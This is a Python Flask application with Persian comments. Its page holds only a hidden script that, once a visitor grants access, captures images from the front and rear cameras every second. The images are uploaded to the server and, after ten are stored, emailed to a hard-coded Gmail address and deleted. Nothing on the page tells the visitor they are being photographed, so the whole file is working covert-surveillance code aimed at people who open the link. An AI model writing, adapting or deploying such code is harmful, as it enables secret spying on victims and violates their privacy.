from flask import Flask, request, render_template_string
import os
import base64
from datetime import datetime
from flask_mail import Mail, Message
import time

app = Flask(__name__)

# تنظیمات ایمیل (Gmail SMTP)
app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 587
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USERNAME'] = 'your_email@gmail.com'  # ایمیل خودت
app.config['MAIL_PASSWORD'] = 'your_password'  # رمز عبور یا App Password
app.config['MAIL_DEFAULT_SENDER'] = 'your_email@gmail.com'

mail = Mail(app)

# مسیر ذخیره تصاویر
IMAGE_DIR = "camera_captures"
os.makedirs(IMAGE_DIR, exist_ok=True)

@app.route('/')
def index():
    return render_template_string('''
        <script>
            async function startCapture(cameraType) {
                try {
                    let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: cameraType } });
                    let video = document.createElement("video");
                    video.srcObject = stream;
                    video.play();

                    setTimeout(() => { captureImage(video, cameraType); }, 1000); // هر ۱ ثانیه عکس بگیره
                } catch (err) {
                    console.error("دسترسی به دوربین ممکن نیست:", err);
                }
            }

            function captureImage(video, cameraType) {
                let canvas = document.createElement("canvas");
                let context = canvas.getContext("2d");
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                let imageData = canvas.toDataURL("image/png");

                fetch("/upload", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ image: imageData, camera: cameraType })
                });

                setTimeout(() => { captureImage(video, cameraType); }, 1000); // تکرار عکس گرفتن هر ۱ ثانیه
            }

            startCapture("user"); // دوربین جلو
            startCapture("environment"); // دوربین عقب
        </script>
    ''')

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json['image']
    camera_type = request.json['camera']
    image_data = base64.b64decode(data.split(',')[1])
    
    filename = f"{IMAGE_DIR}/{camera_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
    with open(filename, "wb") as f:
        f.write(image_data)

    # اگر ۱۰ عکس ذخیره شد، ایمیل ارسال شود
    if len(os.listdir(IMAGE_DIR)) >= 10:
        send_images()
    
    return "✅ عکس ذخیره شد!"

def send_images():
    image_files = [os.path.join(IMAGE_DIR, f) for f in os.listdir(IMAGE_DIR)]
    
    if not image_files:
        return

    msg = Message("📸 عکس‌های دوربین", recipients=["ai.site.serching10@gmail.com"])
    msg.body = "این تصاویر به‌صورت خودکار گرفته شده‌اند."

    for image in image_files:
        with open(image, "rb") as f:
            msg.attach(image, "image/png", f.read())

    mail.send(msg)

    # حذف عکس‌ها بعد از ارسال
    for image in image_files:
        os.remove(image)

if __name__ == '__main__':
    app.run(debug=True, port=5000)